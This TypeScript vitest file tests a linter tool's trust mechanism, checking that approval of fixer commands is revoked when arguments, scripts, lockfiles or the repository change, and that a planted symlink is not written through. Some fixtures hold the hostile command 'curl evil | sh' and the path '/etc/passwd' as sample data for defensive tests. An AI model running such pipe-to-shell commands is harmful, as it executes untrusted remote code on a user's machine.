import { execFileSync } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { paths, UserError } from '../src/config.ts';
import { approval, fixersFingerprint, referencedFiles, trust, untrust } from '../src/trust.ts';

let home: string;
let root: string;
const FIXERS = [{ command: ['pnpm', 'biome', 'check', '--write'], files: ['**/*.ts'] }];

beforeEach(async () => {
  home = await mkdtemp(join(tmpdir(), 'jevlint-trust-'));
  root = await mkdtemp(join(tmpdir(), 'jevlint-trust-root-'));
  vi.stubEnv('XDG_CONFIG_HOME', home);
});

afterEach(async () => {
  vi.unstubAllEnvs();
  await rm(home, { recursive: true, force: true });
  await rm(root, { recursive: true, force: true });
});

const gitIn = (cwd: string, ...args: string[]) =>
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], { cwd });

describe('referencedFiles', () => {
  it("takes arguments naming paths in the root, and each program's own files", () => {
    const files = referencedFiles(root, [
      { command: ['sh', 'scripts/fix.sh', '--config=tools/x.js', '../outside', '/etc/passwd'] },
      { command: ['pnpm', 'eslint', '--fix'] },
    ]);
    expect(files).toContain('scripts/fix.sh');
    expect(files).toContain('tools/x.js');
    expect(files).toContain('package.json');
    expect(files).toContain('pnpm-lock.yaml');
    expect(files).toContain('eslint.config.js');
    expect(files.some((file) => file.includes('..') || file.includes('passwd'))).toBe(false);
  });
});

describe('trust', () => {
  it('approves exactly these commands for this root', async () => {
    expect(await approval(root, FIXERS)).toBe('none');
    await trust(root, FIXERS);
    expect(await approval(root, FIXERS)).toBe('approved');
    expect(await approval(home, FIXERS)).toBe('none');
  });

  it.each([
    ['an argument', [{ ...FIXERS[0], command: ['pnpm', 'biome', 'check', '--unsafe'] }]],
    ['the files', [{ ...FIXERS[0], files: ['**/*'] }]],
    ['retry', [{ ...FIXERS[0], retry: true }]],
    ['another command', [...FIXERS, { command: ['ruff'] }]],
  ])('asks again when %s changes', async (_, changed) => {
    await trust(root, FIXERS);
    expect(await approval(root, changed as typeof FIXERS)).toBe('changed');
  });

  it('asks again when a script the command runs changes or appears', async () => {
    const fixers = [{ command: ['sh', 'scripts/fix.sh'] }];
    await trust(root, fixers);
    await mkdir(join(root, 'scripts'));
    await writeFile(join(root, 'scripts/fix.sh'), 'true\n');
    expect(await approval(root, fixers)).toBe('changed');
    await trust(root, fixers);
    await writeFile(join(root, 'scripts/fix.sh'), 'curl evil | sh\n');
    expect(await approval(root, fixers)).toBe('changed');
  });

  it("asks again when the runner's scripts or lockfile change", async () => {
    await writeFile(join(root, 'package.json'), '{"scripts":{}}');
    await trust(root, FIXERS);
    await writeFile(join(root, 'package.json'), '{"scripts":{"biome":"curl evil | sh"}}');
    expect(await approval(root, FIXERS)).toBe('changed');
  });

  it('asks again when another repository sits at the same path', async () => {
    gitIn(root, 'init', '-q');
    gitIn(root, 'commit', '-q', '--allow-empty', '-m', 'one');
    await trust(root, FIXERS);
    expect(await approval(root, FIXERS)).toBe('approved');
    await rm(join(root, '.git'), { recursive: true, force: true });
    gitIn(root, 'init', '-q');
    gitIn(root, 'commit', '-q', '--allow-empty', '-m', 'two');
    expect(await approval(root, FIXERS)).toBe('changed');
  });

  it('fingerprints an unset retry or files the same as their defaults', async () => {
    expect(await fixersFingerprint(root, [{ command: ['x'] }])).toBe(
      await fixersFingerprint(root, [{ command: ['x'], retry: false }]),
    );
  });

  it('keeps other roots when approving and revoking', async () => {
    await trust(root, FIXERS);
    await trust(home, FIXERS);
    expect(await untrust(root)).toBe(true);
    expect(await untrust(root)).toBe(false);
    expect(await approval(root, FIXERS)).toBe('none');
    expect(await approval(home, FIXERS)).toBe('approved');
  });

  it('replaces a planted symlink rather than writing through it', async () => {
    const target = join(home, 'target');
    await writeFile(target, '{}');
    await mkdir(paths.configDir(), { recursive: true });
    await symlink(target, paths.trustFile());
    await trust(root, FIXERS);
    expect(await readFile(target, 'utf8')).toBe('{}');
    expect(await approval(root, FIXERS)).toBe('approved');
  });

  it('reports a broken record as something the user can fix', async () => {
    await mkdir(paths.configDir(), { recursive: true });
    await writeFile(paths.trustFile(), 'not json');
    await expect(approval(root, FIXERS)).rejects.toThrow(UserError);
  });
});
